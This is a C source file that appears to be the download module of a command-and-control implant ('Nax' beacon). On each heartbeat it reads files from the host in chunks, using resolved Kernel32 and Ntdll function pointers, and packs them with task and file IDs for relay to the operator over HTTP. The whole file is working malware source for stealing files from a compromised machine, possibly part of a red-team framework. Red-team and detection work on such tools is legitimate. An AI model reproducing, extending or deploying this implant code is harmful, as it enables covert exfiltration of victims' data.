/* beacon/src/Commands/Downloader.c
 * Per-heartbeat download chunk relay.
 *
 * NaxProcessDownloads() is called from the heartbeat relay phase (after task
 * dispatch, alongside pivots/jobs/tunnels).  For each active NAX_DOWNLOAD it
 * reads one NAX_DL_CHUNK_SIZE chunk and packs a result entry.
 *
 * Output buffer format (packed entries, parsed by HttpRelayDownloads):
 *   [taskId(4LE)][dataLen(4LE)][data(n)]   repeated
 *
 * data for CONTINUE:
 *   [NAX_DL_CONTINUE(1)][fileId(4LE)][chunk_bytes]
 *
 * data for FINISH:
 *   [NAX_DL_FINISH(1)][fileId(4LE)] */

#include "Nax.h"

FUNC UINT32 NaxProcessDownloads( PNAX_INSTANCE Nax, PBYTE out, UINT32 out_cap ) {
    UINT32       off  = 0;
    NAX_DOWNLOAD* dl   = Nax->DownloadHead;
    NAX_DOWNLOAD** prev = &Nax->DownloadHead;

    while ( dl ) {
        NAX_DOWNLOAD* next = dl->Next;

        UINT32 chunkSz = dl->ChunkSize ? dl->ChunkSize : Nax->Config.DlChunkSize;
        if ( chunkSz == 0 || chunkSz > NAX_DL_CHUNK_MAX )
            chunkSz = NAX_DL_CHUNK_DEFAULT;
        UINT32 want = chunkSz;
        if ( dl->Index + want > dl->FileSize )
            want = dl->FileSize - dl->Index;

        /* space check: header(8) + sub(1) + fileId(4) + data(want) */
        UINT32 entry_sz = 8 + 1 + 4 + want;
        if ( off + entry_sz > out_cap ) {
            prev = &dl->Next;
            dl   = next;
            continue;
        }

        DWORD  nread = 0;
        BOOL   ok    = TRUE;
        if ( want > 0 )
            ok = Nax->Kernel32.ReadFile( dl->hFile, out + off + 8 + 1 + 4, want, &nread, NULL );

        if ( !ok || ( want > 0 && nread == 0 ) ) {
            Nax->Kernel32.CloseHandle( dl->hFile );
            *prev = next;
            Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, dl );
            dl = next;
            continue;
        }

        UINT32 data_len = 1 + 4 + nread;
        NaxW32( out + off, dl->TaskId );   off += 4;
        NaxW32( out + off, data_len );     off += 4;
        out[ off++ ] = NAX_DL_CONTINUE;
        NaxW32( out + off, dl->FileId );   off += 4;
        off += nread;  /* data already in place from ReadFile */

        dl->Index += nread;

        if ( dl->Index >= dl->FileSize ) {
            /* space check for FINISH entry: header(8) + sub(1) + fileId(4) = 13 */
            if ( off + 13 <= out_cap ) {
                NaxW32( out + off, dl->TaskId ); off += 4;
                NaxW32( out + off, 5 );          off += 4;  /* data_len = 1 + 4 */
                out[ off++ ] = NAX_DL_FINISH;
                NaxW32( out + off, dl->FileId ); off += 4;
            }
            Nax->Kernel32.CloseHandle( dl->hFile );
            *prev = next;
            Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, dl );
            dl = next;
            continue;
        }

        prev = &dl->Next;
        dl   = next;
    }

    return off;
}
